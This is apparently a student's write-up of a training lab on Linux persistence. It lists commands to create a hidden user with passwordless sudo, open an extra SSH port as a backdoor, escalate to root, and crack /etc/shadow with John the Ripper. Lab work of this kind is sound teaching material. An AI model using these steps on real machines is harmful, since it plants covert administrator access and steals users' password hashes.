Step 1: Shadow People
Create a secret user named sysd. Make sure this user doesn't have a home directory created:


sysadmin@UbuntuDesktop:~$ sudo useradd sysd

Give your secret user a password:


sysadmin@UbuntuDesktop:~$ sudo passwd sysd

Give your secret user a system UID < 1000:


sysadmin@UbuntuDesktop:~$ usermod -u 0314 sysd

Give your secret user the same GID:


sysadmin@UbuntuDesktop:~$ groupmod -g 0314 sysd

Give your secret user full sudo access without the need for a password:


sysadmin@UbuntuDesktop:~$ sudo nano /etc/sudoers
sysd ALL=(ALL:ALL) NOPASSWD:ALL
Test that sudo access works without your password:

 Matching Defaults entries for sysadmin on UbuntuDesktop:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User sysadmin may run the following commands on UbuntuDesktop:
    (ALL : ALL) ALL



Step 2: Smooth Sailing
Edit the sshd_config file:
Port 22
Port 2222



Step 3: Testing Your Configuration Update
Restart the SSH service:


sysadmin@UbuntuDesktop:~$ sudo systemctl reload sshd

Exit the root account:


sysadmin:~\ $ exit
logout
Connection to 192.168.6.105 closed.

SSH to the target machine using your sysd account and port 2222:


sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222
sysd@192.168.6.105's password: 
Use sudo to switch to the root user:


$ sudo su
Step 4: Crack All the Passwords
SSH back to the system using your sysd account and port 2222:


sysadmin@UbuntuDesktop:~$ ssh sysd@192.168.6.105 -p 2222

Escalate your privileges to the root user. Use John to crack the entire /etc/shadow file:


sysadmin:~\ $ sudo su
root@scavenger-hunt:/home/sysadmin# john /etc/shadow
